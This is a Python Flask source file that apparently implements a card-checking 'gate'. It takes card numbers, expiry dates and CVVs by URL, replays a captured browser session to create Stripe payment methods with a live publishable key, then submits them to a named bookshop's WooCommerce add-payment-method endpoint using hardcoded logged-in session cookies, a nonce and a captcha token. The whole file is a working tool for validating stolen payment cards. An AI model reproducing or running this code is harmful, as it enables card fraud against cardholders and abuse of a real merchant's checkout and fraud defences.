from flask import Flask, request, jsonify
import requests
import json
import re

app = Flask(__name__)

def format_card_number(card_number):
    """Format card number with spaces every 4 digits"""
    card_number = str(card_number).replace(' ', '').replace('-', '')
    return ' '.join([card_number[i:i+4] for i in range(0, len(card_number), 4)])

def validate_expiry_date(exp_month, exp_year):
    """Validate and format expiry date"""
    try:
        exp_month = int(str(exp_month).strip())
        exp_year = int(str(exp_year).strip())
        
        if exp_month < 1 or exp_month > 12:
            return False, "Invalid expiration month"
        
        # Handle 2-digit year
        if exp_year < 100:
            if exp_year < 10:
                exp_year = 2000 + exp_year
            else:
                exp_year = 2000 + exp_year
        
        return True, (str(exp_month).zfill(2), str(exp_year))
    except:
        return False, "Invalid expiry date format"

@app.route('/gate=st', methods=['GET'])
def process_payment():
    try:
        # Get parameters from URL
        cc = request.args.get('cc', '')
        cvc = request.args.get('cvv', '') or request.args.get('cvc', '')
        country = request.args.get('country', 'IN')
        
        # Parse CC format
        if '|' in cc:
            parts = cc.split('|')
            if len(parts) >= 4:
                card_number = parts[0].strip()
                exp_month = parts[1].strip()
                exp_year = parts[2].strip()
                cvc = parts[3].strip() if not cvc else cvc
            else:
                return jsonify({
                    'success': False,
                    'error': 'Invalid CC format. Use: cardnumber|mm|yyyy|cvv'
                }), 400
        else:
            return jsonify({
                'success': False,
                'error': 'Invalid CC format. Use: cardnumber|mm|yyyy|cvv'
            }), 400
        
        # Validate expiry date
        valid, expiry_data = validate_expiry_date(exp_month, exp_year)
        if not valid:
            return jsonify({
                'success': False,
                'error': expiry_data
            }), 400
        
        exp_month_formatted, exp_year_formatted = expiry_data
        
        # PART 1: Stripe API Request (exactly as in your code)
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        # Prepare stripe data exactly as in your code
        stripe_data_parts = [
            'type=card',
            f'card[number]={format_card_number(card_number).replace(" ", "+")}',
            f'card[cvc]={cvc}',
            f'card[exp_year]={exp_year_formatted[-2:]}',  # Last 2 digits
            f'card[exp_month]={exp_month_formatted}',
            'allow_redisplay=unspecified',
            f'billing_details[address][country]={country}',
            'payment_user_agent=stripe.js%2F6c35f76878%3B+stripe-js-v3%2F6c35f76878%3B+payment-element%3B+deferred-intent',
            'referrer=https%3A%2F%2Fbookshop.multilit.com',
            'time_on_page=32174',
            'client_attribution_metadata[client_session_id]=1f57d457-dc2c-4e6d-8b80-f59cfe019b27',
            'client_attribution_metadata[merchant_integration_source]=elements',
            'client_attribution_metadata[merchant_integration_subtype]=payment-element',
            'client_attribution_metadata[merchant_integration_version]=2021',
            'client_attribution_metadata[payment_intent_creation_flow]=deferred',
            'client_attribution_metadata[payment_method_selection_flow]=merchant_specified',
            'client_attribution_metadata[elements_session_config_id]=996bc306-a8d8-4e33-a84f-8621ac36171e',
            'client_attribution_metadata[merchant_integration_additional_elements][0]=payment',
            'guid=34461288-8dd1-47ee-ae6e-385ae0f1e4d5595130',
            'muid=e98e75fe-0fff-406c-87eb-7a698336d1000abe71',
            'sid=53349dc5-0552-4215-90ae-3a00a4475b7dc5a0cc',
            'key=pk_live_51KRko2JqYWyFfgByqMLZrabF5QnEd3NY3j57vXcFfmkbXsM84noWXNl8ZtvNwsxu3HWFIB2AnvTjjhKDD2zlV40o00zSgONFxu',
            '_stripe_version=2024-06-20',
            'radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzY1NDczMTY1LCJjZGF0YSI6Ijhad1dTMktFVGkvZld6b2ZFWmR2YXpldmhpRjhWTFhvZ3hYQlhKR0hWaDBWUkFPMjUwcjE0Y2NGcjFqYitkS0c1UFJ6RFg0ekFDbUpXUFhiQmt4bU5XQUtGRERLWXdXVURSeVQ5ZTVBSmpVcy9TOWJDdU9PbzNESGZzNzMwYjZLQTVhMExYVTJERHUzNHh6OGhsTTBPYXVWZ3UxZXlwcWhuT3I3SjFNV3JUdWdUSVQxRFlVaTJOSU1GcFFCekZxcWxqOXB6V0k5bWxYZTRsN3ciLCJwYXNza2V5IjoiZnNjdSsxbGVKKzZnRkhXOHVteUZsbldrM2FjYlBZekFJSkVKNzUrcGtvNzhRNGJGS3BmYk5FdkNyU2ZxS0VKWlpsK0Q5dTVKS3lySXZ6NlI0T3BWMEtOUGcwVXRhVDhYbUIxdHdTYjJ3VEVHMXdvMFVsNnoyRjVFRTVGWkVGSGxJL3phUXVZeVcwbjJsd3lpckhyaGRpcHZ1MzBxSlBmRVpNZzlvMmdnK2NwOHQ3dHJGSDNkMDV4NWFzUkpqcEpLVnp0cTBuMzBaZTlwM2JLdjgrQkdiVVkyZnd2L1VKOGtzSmFRd2kxc1NYOWhiZ1lDV0FpUzgwcHhlSjF5TWhib2dRbWFhamlSajBiT2t4TTFmRUFST284R2FHVlBneGpGNXpJK1V3RFpBMFhFQVlBTFRuZ0RVMHNiM1JZeGl0Sjc0VlNPNlA4TGFjLzk3Zy9NL1dZOHlacSt1WGhDenE0SENGT0V3Tnk3RStqNjQ5Q0djcjB0QVJBM0oyMXI1ZUM3ZFFFZWtJRHRONjdHOXNQeDAzTCt2N21EYk1XZnlvLzAra2NGeHBnQ0EwSEgrT3BPOGUvRlpUR3J2TVVOR3JqRXZ1d2gzMFRQcWxySzB6TVVSN1NSMWdUeGJ5YnY1V3N6VUpqdCtvcnhwZmU5U3gxMmNxUnFuL1FrOFA4cXBhUzBCaE9DV01TRm9pNmhKVFlmRDh4QmFZdkpKQUdFbnJxYTMwb1BaMy9QRlRhYXZiNzl1MlFlTVpaYVlGcXpJSkZ2SG5PbFBDUkZnZjNkUFR4ZytVL0ZwWXFiV3RHS0lyczdqTHdHVW16cEI2RWJYa0dUWGJiL3ZkaWxIc2xwbS9qRzZ0WmttWmc4T3Ixd0NZbktXTSthMmw1azBOazRPV0VHQmFGM1VDcWV2SVhLU2N0NmNYYjNMVUFCaGdIaytMcnNybGY0T0NCL3pnVU1hWHBEa0JRQ3JFVHk1WExaSjUxN1BYOWRQVVpxb3dkc3dUR3k0c3A1dkhDSzBTeUZsRTlBWExtbW9nOGliTEFtZTZxcURFVHZYWGZuVXF2bVRRb0NQVjZnb3dJZkZsNlpXam5XbXVvZkxOeVRWbEMzbTlPV3hLUlJqOVZSeElOb0xKcCt5RWtpdXlhZHk4cVlVd3VkYmt4c0dvM092N0hHblF0NytuNGt4K1lIMjF1eklMRW1xTjB3WFozVy9TbWpXK1g2a0hveDhoMGhkTDg5WkJFa2VXNjhPVmQxUXNyUFpUbVgwY0srMWtJSy90WlpmTDRhc00vQm44TVZpUWZqUVJqMHFZMWZlNllkS2VPY0VHRWFYOXk1VVFwNEVuaE5RR2FlN284WjcyTzh6cngvVU5xMlFtSS9lUzBmR3ZPM3l3bWFXT0R2NGVsdWFpV2RrVWNKY0pyc3k0dFpSUXBackN5M3pCR1JDR1lyaVh4TFNBdisyWnhkeDhIRjBPOWlnbFJhcGgrdnJjNWpQNzR6UVdGdlZIV3dZaWhwUjJXaDM3YWtZa0hpZkI1eElQTmIrQjIrOWZ1NmRjKzhIemdNaVZheXZGOGVBRDFvNkxxOUF1TmtQUWNIbzNDVzFpalZHT2xtWTQ2NUNGRmpJbklqbCtTNHk1Q0tyMWszSWJDYklJTFRFcUVaRERWcU9IY2FuTks1cjZ2dkY4RWNpWHU0ZHRtcTVaNzQ3TFBqQkZJK2oycUNkNSs0enRXUGN0eTNta2N4eXc2Lzhxanl1UTlpN3V6MzFnUHdoU3J3Rm41WHQ1NXVKRGJ5VlA4QkorVklBckNtQnNkYnJqM2NZZTA4WWMyamJ1Mkx1Z21TbHYrd1MyaWlQNldWVTdvZjV1QUZ0UERweGFMZU9BYTViNnB4L3JiSnQrcmNhYUpaZDFXQUkwd2w4ZlBlL1duVHJQZzIzQzIwRy9IOFkvUHhkejE4UEtkOXUzNWJ1NTFFV2dYWHgxWEs3WmVsRUNvdXZoZVZ4NCtwRnJKVGMvV2YyT3F6MkNyNVhKWTlYWnJEVlR0Y0xyOVVvNGNhQ2tYL2lhZHZFZ2ZsZXFzNExENGh1Yk12K1M3a0J6SHVMVEhmc3J0eU1DdUY1TjMzL2hkandTQ05Tamo4a3Ntckpyenp1TVA0bURmY3hsOGxBZm52bkZaZUVERFVXdzlOK2ptSUtMV2ZmQ3Z4dFdrblhRelIxTHRKOG5leEdmUnNiR0Q0N0s5RklGODFCTEduMFh2Y1pwUXNJQS9ORGdwOEtYR1pBUWlxN0lNZGRkKzBzd3BDRkIzQUJhNHJHd2lzd1p2WjZhaWZyZFFhcGIzNmRCS01aUVBEWDY1MU50WmxTdktVZDN3c25aMisvZEJtbGtLQVp2V1ZuSGlWck1yZ0ZCUEJ5RVlRcFh4QjZHZHQyYmVmNHRIS2xjSjFlM1RudmFhdTZ1K2VURFl1M2ltZFVkV291OFFCSm1TcTEwQ0d2SDNXVEh6eEs2aFJDMUZLTHFzQ3pOU29JNGlzV0IvZTBFRkcxNnFqL2VTK1RnVnMvRE54ZHBPbzB1VExWMVJzQkFsbkU1eGIvOFdFQXlrY1Axc3EvQXQ1Iiwia3IiOiIyYjIxODkwYyIsInNoYXJkX2lkIjoyNTkxODkzNTl9.pBWEza2uRyGft4lwP9sJ3CW45qMteoUjXbKLxbNQ91c'
        ]
        
        stripe_data = '&'.join(stripe_data_parts)
        
        # Make first request to Stripe
        stripe_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_headers,
            data=stripe_data
        )
        
        stripe_response.raise_for_status()
        stripe_result = stripe_response.json()
        
        # Get payment method ID from Stripe response
        payment_method_id = stripe_result.get('id')
        
        if not payment_method_id:
            return jsonify({
                'success': False,
                'error': 'No payment method ID returned from Stripe'
            }), 400
        
        # PART 2: Second API Request (exactly as in your code)
        cookies = {
            'wordpress_sec_438871b33c89e20b4b6c9d95b7b1eddf': 'wizardlyaura999%7C1765788431%7ClVcaBWa7NVi7uQn47AJ1NX5v7klwfgmQYY5xt0TZCCS%7Cc9fe950da42037d989112bc2b303c298d4cafd418449fdae53696bf3f8bb80a6',
            '_ga': 'GA1.1.242133832.1764575859',
            '_hjSessionUser_3261952': 'eyJpZCI6ImIyN2Y3Y2VlLWU4NDctNWNiZS1hNjg2LWY2ZmUxM2NhNTVjYiIsImNyZWF0ZWQiOjE3NjQ1NzU4NjA4MDMsImV4aXN0aW5nIjp0cnVlfQ==',
            'hubspotutk': 'f1dee68925d61cf3b3d89818b575abf4',
            '_fbp': 'fb.1.1764575861928.682738287201334136',
            '__stripe_mid': 'e98e75fe-0fff-406c-87eb-7a698336d1000abe71',
            '_gcl_au': '1.1.1430257312.1764575862.1483529673.1764578695.1764578830',
            'wordpress_logged_in_438871b33c89e20b4b6c9d95b7b1eddf': 'wizardlyaura999%7C1765788431%7ClVcaBWa7NVi7uQn47AJ1NX5v7klwfgmQYY5xt0TZCCS%7Cd2bc0575279d6372f7bb9402c47d0d07af9a8ca268265f0dadc119136be30fe1',
            '_monsterinsights_uj': '{"1764575860":"https%3A%2F%2Fbookshop.multilit.com%2F%7C%23%7CHome%20-%20Multilit%20Bookshop%7C%23%7C189","1764575867":"https%3A%2F%2Fbookshop.multilit.com%2Fproduct%2Fthe-spotty-sock-mystery%2F%7C%23%7CThe%20Spotty%20Sock%20Mystery%20-%20Multilit%20Bookshop%7C%23%7C1458","1764575879":"https%3A%2F%2Fbookshop.multilit.com%2Fcheckout%2F%7C%23%7CCheckout%20-%20Multilit%20Bookshop%7C%23%7C62","1764575900":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1764575938":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1764575943":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1764578622":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1764578719":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Flost-password%2F%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1764578726":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Flost-password%2F%3Freset-link-sent%3Dtrue%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1764578744":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Flost-password%2F%3Fshow-reset-form%3Dtrue%26action%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1764578765":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2F%3Fpassword-reset%3Dtrue%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1764578795":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1764578857":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1764578863":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1765294028":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1765294032":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1765294063":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454","1765294071":"https%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CMy%20Account%20-%20Multilit%20Bookshop%7C%23%7C454"}',
            'wfwaf-authcookie-68e65641b1fed02c6bf278f47042f532': '175031%7Cother%7Cread%7C9027e43263e0c78f62ba81c54b6dda58ba9fc0539f04e4cf8b6a87332ddd17df',
            '__cf_bm': 'FIPqFE__im4yxCILgfear5yVUpTH5L618mFvRFlereI-1765473036-1.0.1.1-TBf988Mm9dL8AJZhYL_0vUzMYBMlcRQYzjkD6zaCsf71fX5CsnYXW._xI_8xY.QuReOAHscZ2bxqPA5BQFS1B7go8f8XKaTOCP_MJ9TdeUk',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-12-11%2016%3A40%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fpayment-methods%2F',
            'sbjs_first_add': 'fd%3D2025-12-11%2016%3A40%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fpayment-methods%2F',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
            'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fadd-payment-method%2F',
            '_hjSession_3261952': 'eyJpZCI6IjRmOTc3OTQ5LTk3ZGYtNGEyYy05NGU2LTIwNjE2MDQ5Y2M0YyIsImMiOjE3NjU0NzMwMzc2NjksInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=',
            '__hstc': '77795275.f1dee68925d61cf3b3d89818b575abf4.1764575861088.1765294028613.1765473039486.4',
            '__hssrc': '1',
            '__hssc': '77795275.1.1765473039486',
            '__stripe_sid': '53349dc5-0552-4215-90ae-3a00a4475b7dc5a0cc',
            '_ga_CVFG3GFJ51': 'GS2.1.s1765473036$o4$g0$t1765473067$j29$l0$h0',
        }
        
        headers = {
            'authority': 'bookshop.multilit.com',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://bookshop.multilit.com',
            'referer': 'https://bookshop.multilit.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': '7817991406',
        }
        
        # Make second request
        second_response = requests.post(
            'https://bookshop.multilit.com/wp-admin/admin-ajax.php',
            cookies=cookies,
            headers=headers,
            data=data
        )
        
        second_response.raise_for_status()
        second_result = second_response.json()
        
        # Return combined response
        return jsonify({
            'success': True,
            'stripe_response': {
                'payment_method_id': payment_method_id,
                'card_last4': stripe_result.get('card', {}).get('last4', ''),
                'card_brand': stripe_result.get('card', {}).get('brand', ''),
                'exp_month': exp_month_formatted,
                'exp_year': exp_year_formatted
            },
            'setup_intent_response': second_result,
            'message': 'Both requests completed successfully'
        })
        
    except requests.exceptions.RequestException as e:
        return jsonify({
            'success': False,
            'error': f'API error: {str(e)}',
            'response_text': getattr(e.response, 'text', '') if hasattr(e, 'response') else ''
        }), 500
    except Exception as e:
        return jsonify({
            'success': False,
            'error': f'Internal server error: {str(e)}'
        }), 500

if __name__ == '__main__':
    app.run(debug=True, port=2233)